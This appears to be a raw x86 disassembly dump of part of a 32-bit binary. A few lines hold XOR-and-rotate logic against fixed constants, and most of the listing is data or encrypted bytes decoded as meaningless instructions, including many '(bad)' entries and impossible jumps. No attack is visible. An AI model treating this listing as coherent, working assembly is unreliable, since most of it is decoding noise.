  406e1d:	fs xchg ebx,eax
  406e1f:	mov    al,ds:0x25740f8d
  406e24:	aam    0xe2
  406e26:	aad    0xd6
  406e28:	dec    ebp
  406e29:	inc    edx
  406e2a:	fidiv  DWORD PTR [eax]
  406e2c:	(bad)  
  406e2d:	ins    BYTE PTR es:[edi],dx
  406e2e:	adc    BYTE PTR [eax+eiz*1+0x76],0x46
  406e33:	or     al,0x36
  406e35:	cs ins BYTE PTR es:[edi],dx
  406e37:	stc    
  406e38:	dec    esp
  406e39:	fisttp DWORD PTR [ebx+0x18]
  406e3c:	(bad)  
  406e3e:	stc    
  406e3f:	adc    DWORD PTR [edx],esi
  406e41:	jne    0x406e20
  406e43:	jge    0x406e10
  406e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e46:	ins    BYTE PTR es:[edi],dx
  406e47:	and    DWORD PTR [esi+0x14568c3b],edi
  406e4d:	mov    DWORD PTR [ebp+0x10],edx
  406e50:	mov    edx,DWORD PTR [esi+0x4]
  406e53:	xor    eax,0xcb79b576
  406e58:	mov    DWORD PTR [ebp+0x14],edx
  406e5b:	cmp    eax,DWORD PTR [ebp+0x10]
  406e5e:	jne    0x407653
  406e64:	mov    eax,edx
  406e66:	cmp    DWORD PTR [ebp+0xc],eax
  406e69:	jne    0x407653
  406e6f:	mov    eax,DWORD PTR [esi]
  406e71:	mov    edx,DWORD PTR [esi+0x4]
  406e74:	mov    eax,DWORD PTR [esi]
  406e76:	mov    edx,DWORD PTR [esi+0x4]
  406e79:	mov    edx,eax
  406e7b:	xor    eax,eax
  406e7d:	shl    edx,0x1e
  406e80:	mov    DWORD PTR [ebp+0x10],eax
  406e83:	mov    eax,DWORD PTR [esi]
  406e85:	xor    edx,0x80000000
  406e8b:	mov    DWORD PTR [ebp+0x14],edx
  406e8e:	mov    edx,DWORD PTR [esi+0x4]
  406e91:	xor    eax,0xcb79b577
  406e96:	xor    ecx,edx
  406e98:	shrd   eax,ecx,0x2
  406e9c:	or     eax,DWORD PTR [ebp+0x10]
  406e9f:	shr    ecx,0x2
  406ea2:	mov    DWORD PTR [ebp+0x8],eax
  406ea5:	mov    eax,ecx
  406ea7:	or     eax,DWORD PTR [ebp+0x14]
  406eaa:	mov    ecx,DWORD PTR [ebx]
  406eac:	mov    edx,DWORD PTR [ebx+0x4]
  406eaf:	push   eax
  406eb0:	push   DWORD PTR [ebp+0x8]
  406eb3:	push   edx
  406eb4:	push   ecx
  406eb5:	call   0x41594e
  406eba:	mov    eax,DWORD PTR [esi]
  406ebc:	mov    ecx,DWORD PTR [esi+0x4]
  406ebf:	shrd   eax,ecx,0x2
  406ec3:	shr    ecx,0x2
  406ec6:	shr    edx,0x1e
  406ec9:	xor    ecx,0xe70ae2ba
  406ecf:	push   ecx
  406ed0:	xor    eax,edi
  406ed2:	mov    DWORD PTR [ebp+0x10],edx
  406ed5:	mov    edx,DWORD PTR [ebx]
  406ed7:	mov    edi,DWORD PTR [ebx+0x4]
  406eda:	push   eax
  406edb:	push   edi
  406edc:	push   edx
  406edd:	call   0x41594e
  406ee2:	shld   edx,eax,0x2
  406ee6:	mov    ecx,edx
  406ee8:	xor    edx,edx
  406eea:	or     ecx,edx
  406eec:	mov    edx,DWORD PTR [esi]
  406eee:	mov    edi,DWORD PTR [esi+0x4]
  406ef1:	shl    eax,0x2
  406ef4:	or     eax,DWORD PTR [ebp+0x10]
  406ef7:	jmp    0x407298
  406efc:	test   al,0xc
  406efe:	lea    ebp,[esi]
  406f00:	mov    cl,0xbc
  406f02:	test   al,0x9c
  406f04:	sahf   
  406f05:	cld    
  406f06:	lds    esp,FWORD PTR [ebp+edi*8-0x416f2099]
  406f0d:	dec    ecx
  406f0e:	mov    esi,0xbec4bdbe
  406f13:	mov    esi,0xc4435417
  406f18:	xchg   ebp,eax
  406f19:	pop    eax
  406f1a:	inc    ebx
  406f1b:	inc    eax
  406f1c:	add    eax,0x488c2eed
  406f21:	mov    al,0x86
  406f23:	cmp    esp,DWORD PTR [edx+0x56b3ac28]
  406f29:	(bad)  
  406f2a:	cli    
  406f2b:	pop    ss
  406f2c:	and    BYTE PTR [ebp+edx*2+0x30],0x47
  406f31:	xor    BYTE PTR [eax-0x6204312c],cl
  406f37:	repz mov esi,0x3d412a77
  406f3d:	shl    DWORD PTR [edi],cl
  406f3f:	pop    ebx
  406f40:	mov    bh,0x16
  406f42:	cdq    
  406f43:	addr16 ja 0x406fa3
  406f46:	scas   al,BYTE PTR es:[edi]
  406f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f48:	pusha  
  406f49:	or     DWORD PTR [ebx-0x69d6d707],esp
  406f4f:	mov    ecx,0x8835cbb7
  406f54:	(bad)  
  406f55:	sbb    BYTE PTR [ecx+0x2f],al
  406f58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f59:	shl    DWORD PTR [ebp+0x32fea8f5],0x2c
  406f60:	out    dx,al
  406f61:	mov    ah,0x36
  406f63:	xchg   esi,eax
  406f64:	fst    DWORD PTR [edx-0x40b50ae7]
  406f6a:	pop    edx
  406f6b:	lahf   
  406f6c:	dec    edx
  406f6d:	or     al,0x5f
  406f6f:	rcr    BYTE PTR [ebp+0x960d04a],cl
  406f75:	dec    ebp
  406f76:	jmp    0xfd673903
  406f7b:	cmp    ecx,DWORD PTR [ebp-0x1e]
  406f7e:	mov    esp,0xb1e6e0b
  406f83:	in     eax,0x8a
  406f85:	(bad)  
  406f88:	xlat   BYTE PTR ds:[ebx]
  406f89:	mov    ebx,ss
  406f8b:	test   DWORD PTR cs:[eax-0x3a],esp
  406f8f:	out    0x25,eax
  406f91:	enter  0xc2c5,0x50
  406f95:	imul   eax,DWORD PTR [edx+0x48140344],0x3479f2a8
  406f9f:	push   es
  406fa0:	push   ss
  406fa1:	ret    
  406fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa3:	ret    
  406fa4:	mov    eax,0x9239f494
  406fa9:	fistp  QWORD PTR [eax+0x3]
  406fac:	dec    esi
  406fad:	je     0x406fbe
  406faf:	or     BYTE PTR es:[edi+0x73811ebf],bh
  406fb6:	sub    DWORD PTR [esi+0x20],eax
  406fb9:	mov    eax,ds:0x6463470c
  406fbe:	cwde   
  406fbf:	into   
  406fc0:	push   eax
  406fc1:	aaa    
  406fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fc3:	inc    ebp
  406fc4:	add    eax,0xf235ebf3
  406fc9:	mov    ds:0x85d9ff3d,al
  406fce:	retf   
  406fcf:	fcmovnu st,st(7)
  406fd1:	das    
  406fd2:	fidiv  WORD PTR [edi-0x38]
  406fd5:	jno    0x406f86
  406fd7:	push   ebx
  406fd8:	test   BYTE PTR [eax],0x54
  406fdb:	pop    es
  406fdc:	and    DWORD PTR [edx-0x55],ebx
  406fdf:	rol    DWORD PTR [ebp-0x6c3156c8],1
  406fe5:	(bad)  
  406fe6:	inc    ecx
  406fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fe8:	xor    eax,0x7f871bb7
  406fed:	fadd   DWORD PTR [ebx]
  406fef:	mov    ds:0xd0dd9601,eax
  406ff4:	call   0xe12335ab
  406ff9:	imul   esi,DWORD PTR [ebp-0x8],0x1e9816ee
  407000:	(bad)  
  407001:	iret   
  407002:	push   es
  407003:	test   DWORD PTR [ecx],ecx
  407005:	inc    edi
  407006:	mov    esi,0x4fea1c86
  40700b:	push   edx
  40700c:	pusha  
  40700d:	cmovl  edx,edi
  407010:	push   ebx
  407011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407012:	xchg   ecx,eax
  407013:	and    ch,BYTE PTR [ebx-0xe174a4f]
  407019:	in     eax,dx
  40701a:	and    DWORD PTR [edi],ebx
  40701c:	xchg   edi,eax
  40701d:	mov    al,0x8
  40701f:	daa    
  407020:	mov    ds:0xce5c56ba,eax
  407025:	inc    eax
  407027:	cmp    eax,0xed56de3b
  40702c:	arpl   WORD PTR [edi+eiz*2+0x10],di
  407030:	test   al,0xd4
  407032:	mov    BYTE PTR [eax-0x67a1c338],ah
  407038:	mov    edi,0xaaa4ff2
  40703d:	aad    0x76
  40703f:	loop   0x407019
  407041:	or     al,0xf1
  407043:	fild   DWORD PTR ds:0xd4eb3455
  407049:	xlat   BYTE PTR ds:[ebx]
  40704a:	iret   
  40704b:	ins    DWORD PTR es:[edi],dx
  40704c:	xchg   esp,eax
  40704d:	pop    ecx
  40704e:	and    ebp,DWORD PTR [esi-0x36aa673]
  407054:	les    ebp,FWORD PTR [edx+0xc]
  407057:	in     eax,0x60
  407059:	cmp    al,0xdd
  40705b:	adc    dh,BYTE PTR [edi+0x78a35fdc]
  407061:	xchg   ebx,eax
  407062:	cmp    bl,BYTE PTR [esi]
  407064:	fdivr  st,st(5)
  407066:	(bad)  
  407067:	icebp  
  407068:	and    eax,0xcab36db8
  40706d:	stos   BYTE PTR es:[edi],al
  40706e:	int3   
  40706f:	imul   ebx,esp,0x61
  407072:	sub    BYTE PTR [ecx-0x76],bh
  407075:	fild   WORD PTR [ecx+ebp*1]
  407078:	pop    ds
  407079:	inc    esp
  40707a:	out    0xd4,al
  40707c:	outs   dx,BYTE PTR ds:[esi]
  40707d:	and    eax,0x969506fd
  407082:	test   eax,0x8700f044
  407087:	jmp    0xf25832ba
  40708c:	icebp  
  40708d:	pop    eax
  40708e:	cli    
  40708f:	cmc    
  407090:	sbb    al,0x69
  407092:	sar    BYTE PTR [ecx+0x48d92cf],0xb2
  407099:	jb     0x40701f
  40709b:	push   ds
  40709c:	jg     0x4070e5
  40709e:	imul   esi,DWORD PTR [edx+0x1d625196],0x4b219688
  4070a8:	jecxz  0x40704b
  4070aa:	push   ebp
  4070ab:	sbb    BYTE PTR [esp+eax*8-0x32037798],bl
  4070b2:	sbb    esp,DWORD PTR [esi+0x19]
  4070b5:	iret   
  4070b6:	cmp    eax,0x9fce3c31
  4070bb:	mov    dl,0xfe
  4070bd:	fst    DWORD PTR [edi-0x1f]
  4070c0:	shl    DWORD PTR [ecx],cl
  4070c2:	mov    bh,0xd7
  4070c4:	std    
  4070c5:	call   0xb5b4e4b2
  4070ca:	das    
  4070cb:	xchg   edx,eax
  4070cc:	xchg   ebp,eax
  4070cd:	loope  0x40711f
  4070cf:	inc    esi
  4070d0:	mov    esp,0x48e06c10
  4070d5:	das    
  4070d6:	mov    dl,0x42
  4070d8:	imul   DWORD PTR [ebx-0x64]
  4070db:	outs   dx,BYTE PTR ds:[esi]
  4070dc:	ss ret 0x6b3c
  4070e0:	aad    0xfc
  4070e2:	stos   DWORD PTR es:[edi],eax
  4070e3:	xor    BYTE PTR [edi+0x31d3751b],ah
  4070e9:	add    ebx,DWORD PTR [edx]
  4070eb:	xchg   ecx,eax
  4070ec:	pop    esp
  4070ed:	inc    ecx
  4070ee:	mov    ah,0xaa
  4070f0:	sar    BYTE PTR [ebp+ebp*8+0x6f],cl
  4070f4:	jmp    0x5c03d42b
  4070f9:	jl     0x4070cc
  4070fb:	fisubr WORD PTR [eax-0x60e8559e]
  407101:	push   0xffffffa8
  407103:	push   0x469b1bd5
  407108:	lods   al,BYTE PTR ds:[esi]
  407109:	mov    BYTE PTR [eax+edi*1+0x57],ch
  40710d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40710e:	ror    DWORD PTR [edi+0x1c],0x4a
  407112:	fsub   QWORD PTR [ebx-0x9]
  407115:	cmp    esi,edx
  407117:	mov    al,0x9b
  407119:	cmp    al,0x21
  40711b:	dec    esi
  40711c:	retf   
  40711d:	xor    esi,eax
  40711f:	out    dx,eax
  407120:	jae    0x407107
  407122:	cmp    eax,0xc1f3040e
  407127:	jns    0x4070cf
  407129:	jecxz  0x407131
  40712b:	push   ebx
  40712c:	in     eax,dx
  40712d:	in     eax,dx
  40712e:	mov    DWORD PTR [ecx],eax
  407130:	in     eax,0xa9
  407132:	(bad)  
  407133:	mov    cl,0xe9
  407135:	(bad)  [ecx+0x1a004dd5]
  40713b:	cmovo  ebp,DWORD PTR [ebx+0x498c87c2]
  407142:	add    BYTE PTR [ecx+ebp*4-0x37],bh
  407146:	cmp    dh,BYTE PTR [edi-0x795978b6]
  40714c:	loopne 0x4071b3
  40714e:	jnp    0x4071a7
  407150:	call   0xe77a:0x6d519020
  407157:	pop    ss
  407158:	lods   eax,DWORD PTR ds:[esi]
  407159:	adc    al,0x87
  40715b:	pop    es
  40715c:	jmp    0x7be9:0xe8f47e30
  407163:	and    DWORD PTR [esi],ebx
  407165:	sbb    cl,bl
  407167:	loop   0x40712f
  407169:	inc    ebp
  40716a:	scas   eax,DWORD PTR es:[edi]
  40716b:	or     eax,0x9c2334af
  407170:	loopne 0x407140
  407172:	sbb    al,0x3e
  407174:	cmp    al,BYTE PTR fs:[ebp+0x42]
  407178:	lods   al,BYTE PTR ds:[esi]
  407179:	or     DWORD PTR [ebx+0x5ecefeb],edx
  40717f:	bound  esi,QWORD PTR [esi-0x2c45c549]
  407185:	leave  
  407186:	cmc    
  407187:	jle    0x407201
  407189:	add    ebp,ebx
  40718b:	gs sub esi,eax
  40718e:	inc    ebx
  40718f:	ja     0x4071e7
  407191:	ficomp DWORD PTR [ebx+edi*1-0x42]
  407195:	mov    ch,0xbe
  407197:	inc    ebx
  407198:	sbb    DWORD PTR [edi+eax*2+0x17a96afc],ebx
  40719f:	je     0x4071f6
  4071a1:	push   cs
  4071a2:	pop    ss
  4071a3:	push   esp
  4071a4:	loop   0x4071c9
  4071a6:	push   ebx
  4071a7:	xor    ebx,DWORD PTR [edi-0x7f37b427]
  4071ad:	jmp    0x4071fd
  4071af:	mov    ds:0x9a9294e2,al
  4071b4:	in     al,0xcf
  4071b6:	ret    
  4071b7:	dec    edx
  4071b8:	mov    ch,0x43
  4071ba:	retf   0x6b15
  4071bd:	dec    ebp
  4071be:	mov    bl,BYTE PTR [esi]
  4071c0:	mov    ds:0x26a9df03,eax
  4071c5:	(bad)  
  4071c7:	jbe    0x407232
  4071c9:	xor    DWORD PTR [ebp+eiz*1-0x40],eax
  4071cd:	lods   al,BYTE PTR ds:[esi]
  4071ce:	add    ecx,DWORD PTR [ebx]
  4071d0:	mov    BYTE PTR [ecx-0x6e],ah
  4071d3:	or     al,BYTE PTR [eax]
  4071d5:	push   es
  4071d6:	shl    DWORD PTR [ebp-0x5b67dd30],0x40
  4071dd:	push   esp
  4071de:	cmp    edx,edx
  4071e0:	mov    dl,0xdf
  4071e2:	sub    BYTE PTR [esi],0xcf
  4071e5:	add    al,BYTE PTR [ebp+0x1ba1d1df]
  4071eb:	pmaxub mm4,QWORD PTR [edx]
  4071ee:	dec    ecx
  4071ef:	mov    edx,0x60daa60d
  4071f4:	adc    al,0x93
  4071f6:	xor    DWORD PTR [esi+esi*4-0x37762699],edi
  4071fd:	push   0xc5a37a28
  407202:	jg     0x4071fa
  407204:	and    eax,ebp
  407206:	imul   esi,DWORD PTR [esi+0x334ed863],0x26
  40720d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40720e:	cwde   
  40720f:	sub    edi,DWORD PTR [esi-0x5a503271]
  407215:	fs dec edx
  407217:	lods   eax,DWORD PTR ds:[esi]
  407218:	jo     0x407245
  40721a:	bound  esi,QWORD PTR [edi]
  40721c:	jecxz  0x4071d4
  40721e:	ds inc ecx
  407220:	dec    ecx
  407221:	mov    al,ds:0x904b9934
  407226:	mov    ds:0x1a9a6ba1,al
  40722b:	mov    BYTE PTR [eax+esi*8-0x2f3269da],bh
  407232:	(bad)  
  407233:	rcl    BYTE PTR [edx-0x459b2fe8],cl
  407239:	cmp    DWORD PTR [eax-0x76],ecx
  40723c:	or     eax,0xe773fd0f
  407241:	sbb    dl,BYTE PTR [ebx-0x64]
  407244:	fnstcw WORD PTR [ebx]
  407246:	add    BYTE PTR [edx],ch
  407248:	sar    BYTE PTR [edx],1
  40724a:	jmp    0x2b3c6306
  40724f:	sahf   
  407250:	push   edx
  407251:	xchg   ebx,eax
  407252:	sub    eax,0xbf5bfb12
  407257:	pop    edx
  407258:	rol    BYTE PTR [edx],1
  40725a:	mov    DWORD PTR [eax],eax
  40725c:	ror    BYTE PTR [ecx+0x26],1
  40725f:	sbb    al,0xfe
  407261:	cmp    eax,0x3e67b68
  407266:	ret    0x5e32
  407269:	mov    al,0xe6
  40726b:	push   es
  40726c:	xor    DWORD PTR [eax-0x48],0xffffff97
  407270:	mov    bl,0x27
  407272:	sub    ebp,eax
  407274:	icebp  
  407275:	and    cl,al
  407277:	inc    esp
  407278:	rcr    DWORD PTR [edi+0x79],1
  40727b:	jecxz  0x40722b
  40727d:	adc    eax,edi
  40727f:	test   BYTE PTR [ebx+0x1e3cf693],dl
  407285:	cmp    al,0x64
  407287:	xchg   esi,eax
  407288:	add    al,0xd2
  40728a:	loopne 0x4072dd
  40728c:	jge    0x40729d
  40728e:	sub    al,0xe8
  407290:	lahf   
  407291:	pop    eax
  407292:	pop    eax
  407293:	xchg   DWORD PTR [eax-0x51],ebp
  407296:	mov    ch,0x8e
  407298:	xor    edi,ecx
  40729a:	xor    edx,eax
  40729c:	xor    edx,0xcb79b576
  4072a2:	xor    edi,0x9c2b8ae8
  4072a8:	mov    DWORD PTR [esi],edx
  4072aa:	jmp    0x40764b
  4072af:	mov    bl,0xe6
  4072b1:	ds lahf 
  4072b3:	pushf  
  4072b4:	test   al,0xb4
  4072b6:	stc    
  4072b7:	jo     0x4072e0
  4072b9:	inc    edx
  4072ba:	fucom  st(0)
  4072bc:	repz hlt 
  4072be:	iret   
  4072bf:	mov    ebp,0xbdbebe4f
  4072c4:	les    edi,FWORD PTR [esi-0x6e5b7142]
  4072ca:	ret    
  4072cb:	pop    ecx
  4072cc:	lahf   
  4072cd:	mov    al,0x41
  4072cf:	push   es
  4072d0:	out    dx,eax
  4072d1:	dec    esp
  4072d2:	jmp    0x4072a8
  4072d4:	addr16 and al,0x83
  4072d7:	ret    
  4072d8:	sub    DWORD PTR [ebx-0x2d],edx
  4072db:	addr16 push edx
  4072dd:	stos   DWORD PTR es:[edi],eax
  4072de:	add    BYTE PTR [esi+0x4a71953b],0xe0
  4072e5:	and    BYTE PTR [edx],bl
  4072e7:	add    bl,BYTE PTR [edi]
  4072e9:	rcr    bl,cl
  4072eb:	cmp    BYTE PTR [esi+0x1c],0xe4
  4072ef:	xchg   edx,eax
  4072f0:	mov    gs,WORD PTR [ebx+0x5f677343]
  4072f6:	xor    dh,BYTE PTR [esi-0x52]
  4072f9:	clc    
  4072fa:	hlt    
  4072fb:	ja     0x40729a
  4072fd:	(bad)  
  4072fe:	xchg   DWORD PTR [ecx],eax
  407300:	dec    ecx
  407301:	iret   
  407302:	imul   edx,DWORD PTR [edi-0x60b217c2],0xffffff86
  407309:	jl     0x407382
  40730b:	push   edx
  40730c:	retf   0x7903
  40730f:	xchg   BYTE PTR ss:[edx+0x66],dh
  407313:	mov    dh,BYTE PTR [ebp-0x53]
  407316:	jno    0x4072ac
  407318:	mov    ebx,0xd2806825
  40731d:	xor    dh,BYTE PTR [esi]
  40731f:	sbb    al,0x4
  407321:	pop    ecx
  407322:	add    DWORD PTR [ebx+ebp*1],0xda6b8734
  407329:	imul   ebp,DWORD PTR [edx+0x30a68605],0x9ea28233
  407333:	xchg   edi,eax
  407334:	sahf   
  407335:	xlat   BYTE PTR ds:[ebx]
  407336:	mov    edx,0x99164737
  40733b:	call   0x9c4b:0x5bb06e51
  407342:	mov    ds:0x38528dd1,eax
  407347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407348:	push   ebx
  407349:	xchg   ebx,eax
  40734a:	xchg   ebx,eax
  40734b:	pop    eax
  40734c:	xchg   ebx,eax
  40734d:	dec    edi
  40734e:	jg     0x4073ad
  407350:	repnz cdq 
  407352:	push   esi
  407353:	adc    dh,BYTE PTR [ebp-0x6b29b424]
  407359:	inc    edx
  40735a:	adc    al,0xee
  40735c:	adc    BYTE PTR [esp+eax*2-0x309e5676],dl
  407363:	iret   
  407364:	rcl    BYTE PTR [ecx+esi*1-0x731b529a],1
  40736b:	mov    eax,ds:0x1d443eb3
  407370:	sbb    al,0x5e
  407372:	add    eax,0x872f458
  407377:	test   BYTE PTR [ecx],cl
  407379:	cs push ebp
  40737b:	jecxz  0x4073de
  40737d:	mov    ds:0xb0d219ca,al
  407382:	lods   eax,DWORD PTR ds:[esi]
  407383:	jle    0x4073e4
  407385:	mov    bl,0x54
  407387:	xchg   edi,eax
  407388:	push   eax
  407389:	out    dx,eax
  40738a:	cmp    bl,BYTE PTR [esi+0x59]
  40738d:	mov    dh,0x3f
  40738f:	je     0x407408
  407391:	cdq    
  407392:	xchg   BYTE PTR [eax-0xc],dh
  407395:	popf   
  407396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407397:	outs   dx,DWORD PTR ds:[esi]
  407398:	retf   
  407399:	scas   eax,DWORD PTR es:[edi]
  40739a:	imul   BYTE PTR [edi+ebx*1-0x27]
  40739e:	ss out 0xb5,al
  4073a1:	es xor eax,0xef1b775b
  4073a7:	xchg   DWORD PTR [esi-0x9],esi
  4073aa:	pop    es
  4073ab:	addr16 xchg ecx,eax
  4073ad:	push   0x9ddd2c43
  4073b2:	nop
  4073b3:	cmp    eax,0xe19dc40a
  4073b8:	fdivr  QWORD PTR [edi]
  4073ba:	sub    BYTE PTR [ecx+edi*4-0x3a],dh
  4073be:	je     0x407358
  4073c0:	fwait
  4073c1:	fs aas 
  4073c3:	outs   dx,DWORD PTR ds:[esi]
  4073c4:	fs mov bl,0xd1
  4073c7:	sar    DWORD PTR [ebp+0x518533b6],0xcb
  4073ce:	pop    ecx
  4073cf:	shr    BYTE PTR [ecx],0x19
  4073d2:	sub    edi,ebx
  4073d4:	push   0x871b6d5d
  4073d9:	pop    esp
  4073da:	in     al,0x24
  4073dc:	mov    DWORD PTR [esi],ebx
  4073de:	pop    edi
  4073df:	xchg   ebp,eax
  4073e0:	adc    DWORD PTR [eax+0x14],esp
  4073e3:	and    DWORD PTR [edx-0x24],ecx
  4073e6:	push   cs
  4073e7:	sbb    cl,al
  4073e9:	pop    es
  4073ea:	fmul   QWORD PTR [ecx]
  4073ec:	push   ebp
  4073ed:	push   cs
  4073ee:	test   ebx,ebp
  4073f0:	fs jmp 0xbdea4621
  4073f6:	icebp  
  4073f7:	jns    0x407402
  4073f9:	add    BYTE PTR [edx-0x532a61dd],0x9a
  407400:	jmp    0x4073f9
  407402:	inc    ecx
  407403:	jmp    0xd8cd:0xcfdf82e8
  40740a:	ins    BYTE PTR es:[edi],dx
  40740b:	or     al,0x86
  40740d:	add    DWORD PTR ds:0x3e3ce87c,eax
  407413:	lds    edx,FWORD PTR [esi+eax*8+0x467fc2e5]
  40741a:	jle    0x407438
  40741c:	out    0xb4,al
  40741e:	inc    ebp
  40741f:	test   dh,ah
  407421:	push   es
  407422:	aaa    
  407423:	pop    edi
  407424:	(bad)  
  407425:	and    al,0x37
  407427:	sub    DWORD PTR [edx+0xe2783c5],esi
  40742d:	mov    ss,WORD PTR [ebp-0x3eeaf8d6]
  407433:	cmp    eax,0xf57a5909
  407438:	add    BYTE PTR [edi+0x2a903a4b],al
  40743e:	pop    ecx
  40743f:	jmp    0x40746f
  407441:	jp     0x407457
  407443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407444:	mov    ebp,0xda509455
  407449:	stc    
  40744a:	loopne 0x407484
  40744c:	lods   al,BYTE PTR ds:[esi]
  40744d:	mov    ebx,0x1083152d
  407452:	jg     0x40747b
  407454:	xchg   edx,eax
  407455:	adc    al,0x81
  407457:	ds adc al,0x95
  40745a:	inc    ebx
  40745b:	dec    ecx
  40745c:	xor    eax,0x3d87c91f
  407461:	cmp    eax,0x9b04f218
  407466:	mov    eax,0x48a7981c
  40746b:	adc    esi,ebp
  40746d:	pop    ebp
  40746e:	popa   
  40746f:	ror    esp,1
  407471:	ficom  DWORD PTR [edi-0x2b]
  407474:	lds    ecx,FWORD PTR [ebx]
  407476:	mov    al,0xc5
  407478:	fisubr WORD PTR [eax+0x66]
  40747b:	mov    bl,0xb
  40747d:	fmul   st(1),st
  40747f:	mov    bl,0xad
  407481:	push   ebp
  407482:	dec    ecx
  407483:	addr16 push es
  407485:	add    DWORD PTR [ebx-0x128cdcd5],esi
  40748b:	mov    ah,0x97
  40748d:	aas    
  40748e:	idiv   BYTE PTR [edi+0x49eeb58e]
  407494:	stos   BYTE PTR es:[edi],al
  407495:	pop    edx
  407496:	xchg   ebx,eax
  407497:	jg     0x407457
  407499:	inc    esi
  40749a:	std    
  40749b:	test   DWORD PTR [edx-0x370f769c],esi
  4074a1:	stos   DWORD PTR es:[edi],eax
  4074a2:	arpl   WORD PTR [esi],di
  4074a4:	inc    esp
  4074a5:	mov    esp,0xcf0b3d97
  4074aa:	xchg   esp,eax
  4074ab:	mov    edi,0xce417333
  4074b0:	rcl    BYTE PTR [edx-0x51],1
  4074b3:	test   al,0x28
  4074b5:	cmp    DWORD PTR [edx-0x7cbec7a0],edi
  4074bb:	test   BYTE PTR [ebp-0x1da5a9df],dh
  4074c1:	inc    esi
  4074c2:	test   eax,0x2d0bac40
  4074c7:	lahf   
  4074c8:	(bad)  
  4074c9:	lock mov ecx,0xa5a50c5d
  4074cf:	ja     0x40750f
  4074d1:	push   eax
  4074d2:	mov    ah,0xc7
  4074d4:	pop    ecx
  4074d5:	mov    DWORD PTR ss:[edi+edi*2-0x56],ebx
  4074da:	mov    bh,0x80
  4074dc:	and    al,0x71
  4074de:	test   DWORD PTR [esp+eax*4-0x4f5567f8],0x1d1ddcb9
  4074e9:	aam    0xf1
  4074eb:	js     0x40751f
  4074ed:	jmp    0x4ecd9e7d
  4074f2:	cmc    
  4074f3:	iret   
  4074f4:	cld    
  4074f5:	ins    BYTE PTR es:[edi],dx
  4074f6:	mov    ds:0x516063,eax
  4074fb:	cmp    bl,al
  4074fd:	cmp    eax,DWORD PTR [esi+0x37b36f03]
  407503:	ins    BYTE PTR es:[edi],dx
  407504:	stos   DWORD PTR es:[edi],eax
  407505:	jge    0x4074df
  407507:	mov    edi,0xfa7268df
  40750c:	or     edi,ebx
  40750e:	sub    al,0xb3
  407510:	jmp    0x1f3c:0xe9629d03
  407517:	ins    DWORD PTR es:[edi],dx
  407518:	push   ebp
  407519:	jmp    FWORD PTR [ebx-0x5bdeea25]
  40751f:	mov    edi,0x23bfb018
  407524:	or     BYTE PTR [edi],ch
  407526:	adc    dh,BYTE PTR [eax+eax*1+0x39226549]
  40752d:	dec    esi
  40752e:	out    0xda,al
  407530:	jmp    0x40759a
  407532:	xor    edi,DWORD PTR [edx+0x56220770]
  407538:	test   BYTE PTR [ecx-0x4fc6c315],0xec
  40753f:	rcr    BYTE PTR [ecx-0x17],cl
  407542:	inc    edx
  407543:	call   0x3722:0x81ece70
  40754a:	into   
  40754b:	repnz shr esp,0x65
  40754f:	sbb    eax,0x31401811
  407554:	mov    ebp,0x69a4afc7
  407559:	sub    eax,0xf440d825
  40755e:	sti    
  40755f:	rcl    DWORD PTR [ebx],0x26
  407562:	inc    ebp
  407563:	sub    DWORD PTR [edi+0xbf73ace],ebp
  407569:	jo     0x4075d7
  40756b:	mov    ds:0x8bf0b783,eax
  407570:	lock pop ecx
  407572:	aad    0xf3
  407574:	mov    al,ds:0x817087aa
  407579:	adc    BYTE PTR [esi+0x1a],dh
  40757c:	xlat   BYTE PTR ds:[ebx]
  40757d:	in     al,dx
  40757e:	mov    dl,0xf8
  407580:	dec    edi
  407581:	dec    eax
  407582:	bound  ecx,QWORD PTR [ebp+0x65]
  407585:	lods   eax,DWORD PTR ds:[esi]
  407586:	dec    edi
  407587:	arpl   WORD PTR [edx-0x672cd2d6],sp
  40758d:	mov    al,0x51
  40758f:	lock test DWORD PTR [esi+esi*4-0x6b00be3c],esp
  407597:	mul    BYTE PTR [esi]
  407599:	outs   dx,DWORD PTR ds:[esi]
  40759a:	sbb    DWORD PTR [esi+0x52],ecx
  40759d:	gs stos DWORD PTR es:[edi],eax
  40759f:	rol    BYTE PTR [edi],0x39
  4075a2:	mov    al,BYTE PTR [edx+esi*4]
  4075a5:	push   ss
  4075a6:	mov    cs,WORD PTR [esi+0x23068eb5]
  4075ac:	mov    bl,0xe
  4075ae:	(bad)  
  4075af:	out    dx,eax
  4075b0:	pushf  
  4075b1:	push   edi
  4075b2:	mov    esi,0x5eb58f4
  4075b7:	mov    dh,0x1c
  4075b9:	je     0x4075b2
  4075bb:	(bad)  
  4075bc:	jae    0x4075f7
  4075be:	mov    edx,0x694c4b3d
  4075c3:	rol    DWORD PTR [esi-0x71],0x44
  4075c7:	call   0xd6bd8493
  4075cc:	mov    ?,WORD PTR [eax]
  4075ce:	scas   al,BYTE PTR es:[edi]
  4075cf:	ins    DWORD PTR es:[edi],dx
  4075d0:	xor    BYTE PTR [eax],bl
  4075d2:	lods   al,BYTE PTR ds:[esi]
  4075d3:	xor    ebp,DWORD PTR [eax-0x473935a6]
  4075d9:	jl     0x407608
  4075db:	sbb    esi,edi
  4075dd:	loop   0x407628
  4075df:	cmp    ebx,ecx
  4075e1:	jno    0x40764b
  4075e3:	dec    ebp
  4075e4:	(bad)  
  4075e5:	ds dec edx
  4075e7:	dec    eax
  4075e8:	iretw  
  4075ea:	cld    
  4075eb:	mov    esp,0x2fc82655
  4075f0:	pop    ebx
  4075f1:	(bad)  
  4075f2:	xchg   esp,eax
  4075f3:	int3   
  4075f4:	mov    esi,0x8a6531cc
  4075f9:	mov    ebp,0x84a79cee
  4075fe:	mov    ch,BYTE PTR [esi]
  407600:	or     eax,0x2c0ff8e2
  407605:	(bad)  [ebx+0x78dcc184]
  40760b:	mov    bh,0xf0
